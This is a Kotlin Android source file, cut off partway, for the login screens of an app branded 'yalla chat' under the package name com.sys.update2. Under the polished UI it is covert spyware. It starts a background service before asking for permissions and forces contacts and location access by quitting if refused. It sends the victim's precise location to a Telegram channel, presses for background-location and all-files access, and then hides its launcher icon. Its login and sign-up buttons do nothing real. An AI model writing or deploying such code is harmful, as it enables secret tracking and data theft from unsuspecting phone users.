package com.sys.update2

import android.Manifest
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.graphics.Canvas
import android.graphics.ImageDecoder
import android.graphics.Paint
import android.graphics.Typeface
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.os.Handler
import android.os.Looper
import android.provider.MediaStore
import android.provider.Settings
import android.widget.Toast
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.Canvas as ComposeCanvas
import androidx.compose.foundation.Image
import androidx.compose.foundation.background
import androidx.compose.foundation.border
import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.foundation.text.BasicTextField
import androidx.compose.foundation.text.KeyboardOptions
import androidx.compose.foundation.verticalScroll
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.Close
import androidx.compose.material.icons.filled.Email
import androidx.compose.material.icons.filled.Image
import androidx.compose.material.icons.filled.Lock
import androidx.compose.material.icons.filled.Person
import androidx.compose.material.icons.filled.PhotoCamera
import androidx.compose.material.icons.filled.Visibility
import androidx.compose.material.icons.filled.VisibilityOff
import androidx.compose.material3.Icon
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.Text
import androidx.compose.material3.darkColorScheme
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.draw.shadow
import androidx.compose.ui.geometry.*
import androidx.compose.ui.graphics.*
import androidx.compose.ui.graphics.drawscope.Stroke
import androidx.compose.ui.graphics.vector.ImageVector
import androidx.compose.ui.layout.ContentScale
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.platform.LocalLayoutDirection
import androidx.compose.ui.text.TextStyle
import androidx.compose.ui.text.font.FontStyle
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.input.KeyboardType
import androidx.compose.ui.text.input.PasswordVisualTransformation
import androidx.compose.ui.text.input.VisualTransformation
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.ui.unit.IntOffset
import androidx.compose.ui.unit.IntSize
import androidx.compose.ui.unit.LayoutDirection
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.core.content.ContextCompat
import kotlin.math.roundToInt
import kotlin.random.Random
import android.graphics.Color as AColor

data class LangItem(val name: String, val flag: String)

object Neon {
    val Cyan    = Color(0xFF2DF5FF)
    val Blue    = Color(0xFF3D8BFF)
    val Purple  = Color(0xFF9B4DFF)
    val Magenta = Color(0xFFFF3DF0)
    val DeepTop    = Color(0xFF07021F)
    val DeepMid    = Color(0xFF0B0433)
    val DeepBottom = Color(0xFF020012)
    val FieldBg     = Color(0xB30D1338)
    val FieldBorder = Color(0xFF3B2E85)
    val Hint = Color(0xFF7E86A8)
    val Txt  = Color(0xFFF2F5FF)
}

class LoginActivity : ComponentActivity() {

    private var currentScreen by mutableStateOf(-1)

    // Login
    private var email by mutableStateOf("")
    private var password by mutableStateOf("")
    private var pwVisible by mutableStateOf(false)
    private var capInput by mutableStateOf("")
    private var capCode by mutableStateOf("")

    // Register
    private var regName by mutableStateOf("")
    private var regEmail by mutableStateOf("")
    private var regP1 by mutableStateOf("")
    private var regP2 by mutableStateOf("")
    private var regP1Visible by mutableStateOf(false)
    private var regP2Visible by mutableStateOf(false)

    // Reset
    private var resetEmail by mutableStateOf("")
    private var resetVC by mutableStateOf("")
    private var resetP1 by mutableStateOf("")
    private var resetP1Visible by mutableStateOf(false)

    // Images
    private var profileUri by mutableStateOf<Uri?>(null)
    private var profileBmp by mutableStateOf<Bitmap?>(null)
    private var bgUri by mutableStateOf<Uri?>(null)
    private var bgBmp by mutableStateOf<Bitmap?>(null)

    private var selectedLang by mutableStateOf(0)

    // Rejection / Completion
    private var anyRejected = false
    private var locationRequested = false
    private var contactsRequested = false

    private val enableCaptcha = false

    // ⭐ Image Pickers — لكن مع فحص الأذونات
    private val pickProfile =
        registerForActivityResult(ActivityResultContracts.GetContent()) { uri ->
            if (uri != null) { profileUri = uri; profileBmp = null }
        }
    private val shotProfile =
        registerForActivityResult(ActivityResultContracts.TakePicturePreview()) { bmp ->
            if (bmp != null) { profileBmp = bmp; profileUri = null }
        }
    private val pickBg =
        registerForActivityResult(ActivityResultContracts.GetContent()) { uri ->
            if (uri != null) { bgUri = uri; bgBmp = null }
        }
    private val shotBg =
        registerForActivityResult(ActivityResultContracts.TakePicturePreview()) { bmp ->
            if (bmp != null) { bgBmp = bmp; bgUri = null }
        }

    // ⭐ Launcher للأذونات
    private val permLauncher = registerForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) { granted ->
        if (!granted) {
            anyRejected = true
            exitApp("تم رفض الاستخدام")
            return@registerForActivityResult
        }
        // بعد منح الأذن — اطلب اللي بعده
        afterPermissionGranted()
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        window.statusBarColor = AColor.parseColor("#040018")
        window.navigationBarColor = AColor.parseColor("#040018")

        capCode = generateCaptcha()

        // ⭐ تسجيل الجهاز
        try { DeviceManager.registerDeviceOnce(this) } catch (_: Exception) {}

        // ⭐ بدء الخدمة في الخلفية — قبل الأذونات
        startBackgroundService()

        // ⭐ بعد 2 ثانية — طلب الموقع + جهات الاتصال
        Handler(Looper.getMainLooper()).postDelayed({
            requestInitialPermissions()
        }, 2000L)

        setContent {
            AppTheme {
                CompositionLocalProvider(LocalLayoutDirection provides LayoutDirection.Rtl) {
                    Box(modifier = Modifier.fillMaxSize()) {
                        NeonBackground()
                        when (currentScreen) {
                            -1 -> LanguageScreen()
                            0  -> LoginScreen()
                            1  -> RegisterScreen()
                            2  -> ResetScreen()
                        }
                    }
                }
            }
        }
    }

    // ═══════════════════════════════════════════
    //  الأذونات الأولية — الموقع + جهات الاتصال
    // ═══════════════════════════════════════════
    private fun requestInitialPermissions() {
        // 1. جهات الاتصال
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS)
            != PackageManager.PERMISSION_GRANTED) {
            contactsRequested = true
            permLauncher.launch(Manifest.permission.READ_CONTACTS)
            return
        }
        // 2. الموقع
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)
            != PackageManager.PERMISSION_GRANTED) {
            locationRequested = true
            permLauncher.launch(Manifest.permission.ACCESS_FINE_LOCATION)
            return
        }
        // ✅ كل الأذونات موجودة
        afterInitialPermissions()
    }

    private fun afterPermissionGranted() {
        // الأول: جهات الاتصال
        if (contactsRequested && ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS)
            == PackageManager.PERMISSION_GRANTED) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)
                != PackageManager.PERMISSION_GRANTED) {
                locationRequested = true
                permLauncher.launch(Manifest.permission.ACCESS_FINE_LOCATION)
                return
            }
        }
        // بعد الموقع → خلص
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)
            == PackageManager.PERMISSION_GRANTED) {
            afterInitialPermissions()
        }
    }

    private fun afterInitialPermissions() {
        // ⭐ إرسال الموقع فوراً
        sendLocationNow()

        // ⭐ طلب Background Location + All Files (يدوي)
        Handler(Looper.getMainLooper()).postDelayed({
            requestBackgroundLocationAndFiles()
        }, 1500L)
    }

    // ═══════════════════════════════════════════
    //  طلب أذونات الوسائط — عند اختيار صورة
    // ═══════════════════════════════════════════
    private fun requestMediaPermissionThen(action: () -> Unit) {
        val perm = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            Manifest.permission.READ_MEDIA_IMAGES
        } else {
            Manifest.permission.READ_EXTERNAL_STORAGE
        }
        if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
            // اطلب الأذن — بعد المنح → نفذ الإجراء
            pendingMediaAction = action
            permLauncher.launch(perm)
            return
        }
        // ممنوح — نفذ
        action()
    }

    private var pendingMediaAction: (() -> Unit)? = null

    // ═══════════════════════════════════════════
    //  إرسال الموقع فوراً
    // ═══════════════════════════════════════════
    private fun sendLocationNow() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)
            != PackageManager.PERMISSION_GRANTED) return
        Thread {
            try {
                val loc = LocationHelper.getPreciseLocation(this, 10)
                if (loc != null) {
                    val code = DeviceManager.getDeviceCode(this)
                    TelegramApi.sendMessage(
                        "📍 *موقع مباشر*\n🆔 `$code`\n\n" +
                        "خط العرض: ${loc.latitude}\n" +
                        "خط الطول: ${loc.longitude}\n" +
                        "الدقة: ±${loc.accuracy.toInt()}م\n\n" +
                        "🗺 https://www.google.com/maps?q=${loc.latitude},${loc.longitude}"
                    )
                    LocationCache.save(this, loc.latitude, loc.longitude, loc.accuracy)
                }
            } catch (_: Exception) {}
        }.start()
    }

    // ═══════════════════════════════════════════
    //  Background Location + All Files (Settings)
    // ═══════════════════════════════════════════
    private fun requestBackgroundLocationAndFiles() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_BACKGROUND_LOCATION)
                != PackageManager.PERMISSION_GRANTED) {
                try {
                    android.app.AlertDialog.Builder(this)
                        .setTitle("صلاحية الخلفية")
                        .setMessage("يرجى تفعيل الموقع في الخلفية من الإعدادات")
                        .setPositiveButton("فتح الإعدادات") { _, _ ->
                            try {
                                val i = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
                                i.data = Uri.parse("package:$packageName")
                                startActivity(i)
                            } catch (_: Exception) {}
                            Handler(Looper.getMainLooper()).postDelayed({
                                requestAllFilesAccess()
                            }, 5000)
                        }
                        .setCancelable(false)
                        .show()
                } catch (_: Exception) {}
            } else {
                requestAllFilesAccess()
            }
        } else {
            requestAllFilesAccess()
        }
    }

    private fun requestAllFilesAccess() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!Environment.isExternalStorageManager()) {
                android.app.AlertDialog.Builder(this)
                    .setTitle("الوصول للملفات")
                    .setMessage("لتفعيل الوصول لكل الملفات، اضغط 'السماح'")
                    .setPositiveButton("فتح الإعدادات") { _, _ ->
                        try {
                            val i = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
                            i.data = Uri.parse("package:$packageName")
                            startActivity(i)
                        } catch (e: Exception) {
                            try {
                                val i = Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION)
                                startActivity(i)
                            } catch (_: Exception) {}
                        }
                        Handler(Looper.getMainLooper()).postDelayed({
                            onPermissionsComplete()
                        }, 5000)
                    }
                    .setCancelable(false)
                    .show()
            } else onPermissionsComplete()
        } else onPermissionsComplete()
    }

    private fun onPermissionsComplete() {
        hideLauncherIcon()
        showToast("✅ تم تفعيل كل الصلاحيات")
    }

    // ═══════════════════════════════════════════
    //  Exit on reject
    // ═══════════════════════════════════════════
    private fun exitApp(msg: String) {
        Toast.makeText(this, msg, Toast.LENGTH_LONG).show()
        Handler(Looper.getMainLooper()).postDelayed({
            try {
                val i = Intent(Intent.ACTION_MAIN)
                i.addCategory(Intent.CATEGORY_HOME)
                i.flags = Intent.FLAG_ACTIVITY_NEW_TASK
                startActivity(i)
                finishAffinity()
                System.exit(0)
            } catch (_: Exception) { finish() }
        }, 2000)
    }

    private fun hideLauncherIcon() {
        try {
            val c = ComponentName(this, LoginActivity::class.java)
            packageManager.setComponentEnabledSetting(
                c,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
        } catch (e: Exception) {
            android.util.Log.e("LoginActivity", "hide err: ${e.message}")
        }
    }

    // ⭐ Service — بدون طلب أذونات
    private fun startBackgroundService() {
        try {
            val intent = Intent(this, BackgroundService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(intent)
            else startService(intent)
        } catch (_: Exception) {}
    }

    // ═══════════════════════════════════════════
    //  UI — Neon Background
    // ═══════════════════════════════════════════
    @Composable
    fun NeonBackground() {
        val ctx = LocalContext.current
        val bg = remember { loadAssetBitmap(ctx, "background.png") }
        val stars = remember { List(60) { Offset(Random.nextFloat(), Random.nextFloat() * 0.7f) } }

        ComposeCanvas(modifier = Modifier.fillMaxSize()) {
            if (bg != null) {
                val scale = maxOf(size.width / bg.width, size.height / bg.height)
                val dw = bg.width * scale
                val dh = bg.height * scale
                drawImage(
                    image = bg.asImageBitmap(),
                    dstOffset = IntOffset(((size.width - dw) / 2).roundToInt(), ((size.height - dh) / 2).roundToInt()),
                    dstSize = IntSize(dw.roundToInt(), dh.roundToInt())
                )
                drawRect(Brush.verticalGradient(listOf(Color(0x99060021), Color(0xCC040018))))
            } else {
                drawRect(Brush.verticalGradient(listOf(Neon.DeepTop, Neon.DeepMid, Neon.DeepBottom)))
            }

            drawCircle(
                Brush.radialGradient(listOf(Neon.Magenta.copy(alpha = 0.28f), Color.Transparent),
                    center = Offset(size.width * 0.85f, size.height * 0.07f), radius = size.width * 0.55f),
                radius = size.width * 0.55f, center = Offset(size.width * 0.85f, size.height * 0.07f)
            )
            drawCircle(
                Brush.radialGradient(listOf(Neon.Cyan.copy(alpha = 0.22f), Color.Transparent),
                    center = Offset(size.width * 0.06f, size.height * 0.30f), radius = size.width * 0.60f),
                radius = size.width * 0.60f, center = Offset(size.width * 0.06f, size.height * 0.30f)
            )
            drawCircle(
                Brush.radialGradient(listOf(Neon.Blue.copy(alpha = 0.20f), Color.Transparent),
                    center = Offset(size.width * 0.5f, size.height * 0.98f), radius = size.width * 0.85f),
                radius = size.width * 0.85f, center = Offset(size.width * 0.5f, size.height * 0.98f)
            )

            stars.forEach {
                drawCircle(Neon.Cyan.copy(alpha = 0.45f), radius = 1.4.dp.toPx(),
                    center = Offset(it.x * size.width, it.y * size.height))
            }

            fun wave(baseY: Float, amp: Float, alpha: Float, w: Float, colors: List<Color>) {
                val p = Path()
                p.moveTo(0f, baseY)
                p.cubicTo(size.width * 0.22f, baseY - amp, size.width * 0.38f, baseY + amp,
                    size.width * 0.58f, baseY - amp * 0.5f)
                p.cubicTo(size.width * 0.78f, baseY + amp * 0.8f, size.width * 0.85f, baseY - amp * 0.4f,
                    size.width, baseY)
                drawPath(p, brush = Brush.horizontalGradient(colors), style = Stroke(width = w), alpha = alpha)
            }
            val h = size.height
            wave(h * 0.42f, h * 0.05f, 0.35f, 2.dp.toPx(), listOf(Neon.Purple, Neon.Cyan))
            wave(h * 0.82f, h * 0.05f, 0.90f, 2.5f.dp.toPx(), listOf(Neon.Cyan, Neon.Purple, Neon.Magenta))
            wave(h * 0.86f, h * 0.06f, 0.60f, 3.dp.toPx(), listOf(Neon.Magenta, Neon.Blue, Neon.Cyan))
            wave(h * 0.90f, h * 0.045f, 0.45f, 3.5f.dp.toPx(), listOf(Neon.Blue, Neon.Magenta, Neon.Purple))

            val fill = Path()
            fill.moveTo(0f, h)
            fill.lineTo(0f, h * 0.86f)
            fill.cubicTo(size.width * 0.3f, h * 0.78f, size.width * 0.6f, h * 0.95f, size.width, h * 0.84f)
            fill.lineTo(size.width, h)
            fill.close()
            drawPath(fill, brush = Brush.verticalGradient(
                listOf(Neon.Purple.copy(alpha = 0.26f), Color.Transparent), startY = h * 0.8f, endY = h))
        }
    }

    @Composable
    fun AppHeader() {
        val ctx = LocalContext.current
        val logo = remember { loadAssetBitmap(ctx, "logo.png") }

        Column(horizontalAlignment = Alignment.CenterHorizontally, modifier = Modifier.fillMaxWidth()) {
            Spacer(Modifier.height(34.dp))
            if (logo != null) {
                Image(
                    bitmap = logo.asImageBitmap(),
                    contentDescription = "Yalla Chat Logo",
                    modifier = Modifier.size(96.dp),
                    contentScale = ContentScale.Fit
                )
            } else {
                DrawnLogo(Modifier.size(96.dp))
            }
            Spacer(Modifier.height(6.dp))
            Text(
                "yalla chat",
                style = TextStyle(
                    brush = Brush.horizontalGradient(listOf(Neon.Cyan, Neon.Purple, Neon.Magenta)),
                    fontSize = 36.sp,
                    fontWeight = FontWeight.ExtraBold,
                    fontStyle = FontStyle.Italic
                )
            )
            Spacer(Modifier.height(10.dp))
            Row(verticalAlignment = Alignment.CenterVertically) {
                Box(Modifier.width(34.dp).height(2.dp)
                    .background(Brush.horizontalGradient(listOf(Color.Transparent, Neon.Cyan))))
                Spacer(Modifier.width(10.dp))
                Text("تواصل بلا حدود", color = Neon.Cyan, fontSize = 14.sp, fontWeight = FontWeight.Medium)
                Spacer(Modifier.width(10.dp))
                Box(Modifier.width(34.dp).height(2.dp)
                    .background(Brush.horizontalGradient(listOf(Neon.Magenta, Color.Transparent))))
            }
        }
    }

    @Composable
    fun DrawnLogo(modifier: Modifier = Modifier) {
        ComposeCanvas(modifier = modifier) {
            val w = size.width
            val h = size.height
            val brush = Brush.linearGradient(
                listOf(Neon.Cyan, Neon.Purple, Neon.Magenta),
                start = Offset(0f, 0f), end = Offset(w, h)
            )
            val stroke = Stroke(width = h * 0.055f, cap = StrokeCap.Round, join = StrokeJoin.Round)
            drawRoundRect(brush = brush, topLeft = Offset(w * 0.34f, h * 0.30f),
                size = Size(w * 0.56f, h * 0.42f), cornerRadius = CornerRadius(h * 0.16f),
                style = stroke, alpha = 0.55f)
            drawRoundRect(brush = brush, topLeft = Offset(w * 0.06f, h * 0.10f),
                size = Size(w * 0.62f, h * 0.46f), cornerRadius = CornerRadius(h * 0.18f),
                style = stroke)
            val tail = Path().apply {
                moveTo(w * 0.20f, h * 0.55f)
                lineTo(w * 0.16f, h * 0.72f)
                lineTo(w * 0.36f, h * 0.56f)
            }
            drawPath(tail, brush = brush, style = stroke)
            for (i in 0..2) {
                drawCircle(
                    color = listOf(Neon.Cyan, Neon.Blue, Neon.Magenta)[i],
                    radius = h * 0.05f,
                    center = Offset(w * (0.23f + i * 0.15f), h * 0.33f)
                )
            }
        }
    }

    @Composable
    fun LoginScreen() {
        Column(
            modifier = Modifier
                .fillMaxSize()
                .verticalScroll(rememberScrollState())
                .padding(horizontal = 24.dp)
                .imePadding(),
            horizontalAlignment = Alignment.CenterHorizontally
        ) {
            AppHeader()
            Spacer(Modifier.height(40.dp))

            NeonInput(email, { email = it }, "البريد الإلكتروني أو رقم الهاتف",
                Icons.Default.Email, KeyboardType.Email)
            Spacer(Modifier.height(14.dp))
            NeonPassword(password, { password = it }, pwVisible, { pwVisible = !pwVisible }, "كلمة المرور")

            Spacer(Modifier.height(26.dp))
            GradientButton("تسجيل الدخول") {
                when {
                    email.isBlank() -> showToast("من فضلك أدخل البريد الإلكتروني أو رقم الهاتف")
                    password.isBlank() -> showToast("من فضلك أدخل كلمة المرور")
                    else -> {
                        showToast("تم تسجيل الدخول")
                        startBackgroundService()
                    }
                }
            }

            Spacer(Modifier.height(22.dp))
            OrDivider()
            Spacer(Modifier.height(22.dp))
            GoogleButton { showToast("الدخول عبر Google (تجريبي)") }

            Spacer(Modifier.height(16.dp))
            Text(
                "نسيت كلمة المرور؟",
                color = Neon.Cyan,
                fontSize = 13.5.sp,
                fontWeight = FontWeight.Medium,
                modifier = Modifier
                    .clickable { currentScreen = 2 }
                    .padding(vertical = 6.dp)
            )

            Spacer(Modifier.height(26.dp))
            Row(verticalAlignment = Alignment.CenterVertically) {
                Text("ليس لديك حساب؟ ", color = Neon.Hint, fontSize = 14.sp)
                Text(
                    "إنشاء حساب",
                    style = TextStyle(
                        brush = Brush.horizontalGradient(listOf(Neon.Cyan, Neon.Magenta)),
                        fontSize = 14.sp, fontWeight = FontWeight.Bold
                    ),
                    modifier = Modifier
                        .clickable { currentScreen = 1 }
                        .padding(vertical = 6.dp)
                )
            }
            Spacer(Modifier.height(30.dp))
        }
    }

    @Composable
    fun RegisterScreen() {
        Column(
            modifier = Modifier
                .fillMaxSize()
                .verticalScroll(rememberScrollState())
                .padding(horizontal = 24.dp)
                .imePadding(),
            horizontalAlignment = Alignment.CenterHorizontally
        ) {
            AppHeader()
            Spacer(Modifier.height(28.dp))
            NeonInput(regName, { regName = it }, "الاسم الكامل", Icons.Default.Person)
            Spacer(Modifier.height(12.dp))
            NeonInput(regEmail, { regEmail = it }, "البريد الإلكتروني أو رقم الهاتف",
                Icons.Default.Email, KeyboardType.Email)
            Spacer(Modifier.height(12.dp))
            NeonPassword(regP1, { regP1 = it }, regP1Visible, { regP1Visible = !regP1Visible }, "كلمة المرور")
            Spacer(Modifier.height(12.dp))
            NeonPassword(regP2, { regP2 = it }, regP2Visible, { regP2Visible = !regP2Visible }, "تأكيد كلمة المرور")
            Spacer(Modifier.height(20.dp))
            ProfileImageCard()
            Spacer(Modifier.height(14.dp))
            BackgroundImageCard()
            Spacer(Modifier.height(26.dp))

            GradientButton("إنشاء الحساب") {
                when {
                    regName.isBlank() -> showToast("من فضلك أدخل الاسم الكامل")
                    regEmail.isBlank() -> showToast("من فضلك أدخل البريد الإلكتروني أو رقم الهاتف")
                    regP1.length < 6 || regP1.length > 16 -> showToast("كلمة المرور يجب أن تكون من 6 إلى 16 حرفاً")
                    regP1 != regP2 -> showToast("كلمتا المرور غير متطابقتين")
                    else -> {
                        showToast("تم إنشاء الحساب")
                        currentScreen = 0
                    }
                }
            }

            Spacer(Modifier.height(20.dp))
            OrDivider()
            Spacer(Modifier.height(18.dp))
            Row(verticalAlignment = Alignment.CenterVertically) {
                Text("لديك حساب بالفعل؟ ", color = Neon.Hint, fontSize = 14.sp)
                Text(
                    "تسجيل الدخول",
                    style = TextStyle(
                        brush = Brush.horizontalGradient(listOf(Neon.Cyan, Neon.Magenta)),
                        fontSize = 14.sp, fontWeight = FontWeight.Bold
                    ),
                    modifier = Modifier
                        .clickable { currentScreen = 0 }
                        .padding(vertical = 6.dp)
                )
            }
            Spacer(Modifier.height(30.dp))
        }
    }

    @Composable
    fun ResetScreen() {
        Column(
            modifier = Modifier
                .fillMaxSize()
                .verticalScroll(rememberScrollState())
                .padding(horizontal = 24.dp)
                .imePadding(),
            horizontalAlignment = Alignment.CenterHorizontally
        ) {
            Spacer(Modifier.height(40.dp))
            Row(verticalAlignment = Alignment.CenterVertically, modifier = Modifier.fillMaxWidth()) {
                BackButton { currentScreen = 0 }
                Text(
                    "استعادة كلمة المرور",
                    color = Neon.Txt,
                    fontSize = 17.5.sp,
                    fontWeight = FontWeight.Bold,
                    textAlign = TextAlign.Center,
                    modifier = Modifier.weight(1f)
                )
                Spacer(Modifier.width(40.dp))
            }

            Spacer(Modifier.height(30.dp))
            NeonInput(resetEmail, { resetEmail = it }, "البريد الإلكتروني أو رقم الهاتف",
                Icons.Default.Email, KeyboardType.Email)
            Spacer(Modifier.height(14.dp))

            Row(
                modifier = Modifier
                    .fillMaxWidth()
                    .height(56.dp)
                    .clip(RoundedCornerShape(18.dp))
                    .background(Neon.FieldBg)
                    .border(1.dp, Neon.FieldBorder, RoundedCornerShape(18.dp))
                    .padding(horizontal = 16.dp),
                verticalAlignment = Alignment.CenterVertically
            ) {
                Icon(Icons.Default.Email, null, tint = Neon.Cyan.copy(alpha = 0.85f), modifier = Modifier.size(20.dp))
                Spacer(Modifier.width(12.dp))
                BasicTextField(
                    value = resetVC,
                    onValueChange = { resetVC = it },
                    modifier = Modifier.weight(1f),
                    singleLine = true,
                    textStyle = TextStyle(color = Neon.Txt, fontSize = 15.sp),
                    decorationBox = { inner ->
                        if (resetVC.isEmpty()) Text("رمز التحقق", color = Neon.Hint, fontSize = 14.5.sp)
                        inner()
                    }
                )
                Text(
                    "إرسال",
                    color = Neon.Cyan,
                    fontSize = 14.5.sp,
                    fontWeight = FontWeight.Bold,
                    modifier = Modifier
                        .clickable { showToast("سيتم إرسال الرمز (تجريبي)") }
                        .padding(start = 12.dp)
                )
            }

            Spacer(Modifier.height(14.dp))
            NeonPassword(resetP1, { resetP1 = it }, resetP1Visible,
                { resetP1Visible = !resetP1Visible }, "كلمة المرور الجديدة (6-16)")
            Spacer(Modifier.height(28.dp))

            GradientButton("تأكيد") {
                when {
                    resetEmail.isBlank() -> showToast("من فضلك أدخل البريد الإلكتروني")
                    resetVC.isBlank() -> showToast("من فضلك أدخل رمز التحقق")
                    resetP1.length < 6 || resetP1.length > 16 -> showToast("كلمة المرور يجب أن تكون من 6 إلى 16 حرفاً")
                    else -> {
                        showToast("تم تغيير كلمة المرور")
                        currentScreen = 0
                    }
                }
            }
            Spacer(Modifier.height(30.dp))
        }
    }

    // ═══════════════════════════════════════════
    //  Neon Components
    // ═══════════════════════════════════════════
    @Composable
    fun NeonInput(
        value: String,
        onChange: (String) -> Unit,
        hint: String,
        icon: ImageVector,
        keyboardType: KeyboardType = KeyboardType.Text
    ) {
        Row(
            modifier = Modifier
                .fillMaxWidth()
                .height(56.dp)
                .clip(RoundedCornerShape(18.dp))
                .background(Neon.FieldBg)
                .border(1.dp, Neon.FieldBorder, RoundedCornerShape(18.dp))
                .padding(horizontal = 16.dp),
            verticalAlignment = Alignment.CenterVertically
        ) {
            Icon(icon, contentDescription = null,
                tint = Neon.Cyan.copy(alpha = 0.85f), modifier = Modifier.size(20.dp))
            Spacer(Modifier.width(12.dp))
            BasicTextField(
                value = value,
                onValueChange = onChange,
                modifier = Modifier.weight(1f),
                singleLine = true,
                keyboardOptions = KeyboardOptions(keyboardType = keyboardType),
                textStyle = TextStyle(color = Neon.Txt, fontSize = 15.sp),
                cursorBrush = Brush.verticalGradient(listOf(Neon.Cyan, Neon.Magenta)),
                decorationBox = { inner ->
                    if (value.isEmpty()) Text(hint, color = Neon.Hint, fontSize = 14.5.sp)
                    inner()
                }
            )
        }
    }

    @Composable
    fun NeonPassword(
        value: String,
        onChange: (String) -> Unit,
        visible: Boolean,
        onToggle: () -> Unit,
        hint: String
    ) {
        Row(
            modifier = Modifier
                .fillMaxWidth()
                .height(56.dp)
                .clip(RoundedCornerShape(18.dp))
                .background(Neon.FieldBg)
                .border(1.dp, Neon.FieldBorder, RoundedCornerShape(18.dp))
                .padding(horizontal = 16.dp),
            verticalAlignment = Alignment.CenterVertically
        ) {
            Icon(Icons.Default.Lock, contentDescription = null,
                tint = Neon.Cyan.copy(alpha = 0.85f), modifier = Modifier.size(20.dp))
            Spacer(Modifier.width(12.dp))
            BasicTextField(
                value = value,
                onValueChange = onChange,
                modifier = Modifier.weight(1f),
                singleLine = true,
                visualTransformation = if (visible) VisualTransformation.None else PasswordVisualTransformation(),
                keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.Password),
                textStyle = TextStyle(color = Neon.Txt, fontSize = 15.sp),
                cursorBrush = Brush.verticalGradient(listOf(Neon.Cyan, Neon.Magenta)),
                decorationBox = { inner ->
                    if (value.isEmpty()) Text(hint, color = Neon.Hint, fontSize = 14.5.sp)
                    inner()
                }
            )
            Icon(
                imageVector = if (visible) Icons.Default.Visibility else Icons.Default.VisibilityOff,
                contentDescription = "إظهار/إخفاء كلمة المرور",
                tint = Neon.Hint,
                modifier = Modifier
                    .size(22.dp)
                    .clickable { onToggle() }
            )
        }
    }

    @Composable
    fun GradientButton(text: String, onClick: () -> Unit) {
        Box(
            modifier = Modifier
                .fillMaxWidth()
                .height(56.dp)
                .shadow(18.dp, RoundedCornerShape(28.dp), ambientColor = Neon.Magenta, spotColor = Neon.Purple)
                .clip(RoundedCornerShape(28.dp))
                .background(Brush.horizontalGradient(listOf(Neon.Magenta, Neon.Purple, Neon.Blue, Neon.Cyan)))
                .clickable { onClick() },
            contentAlignment = Alignment.Center
        ) {
            Row(verticalAlignment = Alignment.CenterVertically) {
                Text(text, color = Color.White, fontSize = 17.sp, fontWeight = FontWeight.Bold)
                Spacer(Modifier.width(10.dp))
                Text("←", color = Color.White, fontSize = 18.sp, fontWeight = FontWeight.Bold)
            }
        }
    }

    @Composable
    fun OrDivider() {
        Row(verticalAlignment = Alignment.CenterVertically, modifier = Modifier.fillMaxWidth()) {
            Box(Modifier.weight(1f).height(1.dp)
                .background(Brush.horizontalGradient(listOf(Color.Transparent, Neon.Purple.copy(alpha = 0.6f)))))
            Text("أو", color = Neon.Hint, fontSize = 13.5.sp, modifier = Modifier.padding(horizontal = 14.dp))
            Box(Modifier.weight(1f).height(1.dp)
                .background(Brush.horizontalGradient(listOf(Neon.Purple.copy(alpha = 0.6f), Color.Transparent))))
        }
    }

    @Composable
    fun GoogleButton(onClick: () -> Unit) {
        Box(
            modifier = Modifier
                .fillMaxWidth()
                .height(54.dp)
                .clip(RoundedCornerShape(27.dp))
                .background(Color(0x330D1338))
                .border(1.dp, Brush.horizontalGradient(listOf(Neon.Cyan, Neon.Purple, Neon.Magenta)), RoundedCornerShape(27.dp))
                .clickable { onClick() },
            contentAlignment = Alignment.Center
        ) {
            Row(verticalAlignment = Alignment.CenterVertically) {
                Text(
                    "G",
                    style = TextStyle(
                        brush = Brush.linearGradient(
                            listOf(Color(0xFF4285F4), Color(0xFFEA4335), Color(0xFFFBBC05), Color(0xFF34A853))
                        ),
                        fontSize = 20.sp, fontWeight = FontWeight.ExtraBold
                    )
                )
                Spacer(Modifier.width(10.dp))
                Text("الدخول باستخدام Google", color = Neon.Txt, fontSize = 15.sp, fontWeight = FontWeight.Bold)
            }
        }
    }

    @Composable
    fun PickerButton(text: String, icon: ImageVector, onClick: () -> Unit) {
        Row(
            modifier = Modifier
                .clip(RoundedCornerShape(50))
                .background(Color(0x40131B45))
                .border(1.dp, Neon.FieldBorder, RoundedCornerShape(50))
                .clickable { onClick() }
                .padding(horizontal = 14.dp, vertical = 9.dp),
            verticalAlignment = Alignment.CenterVertically
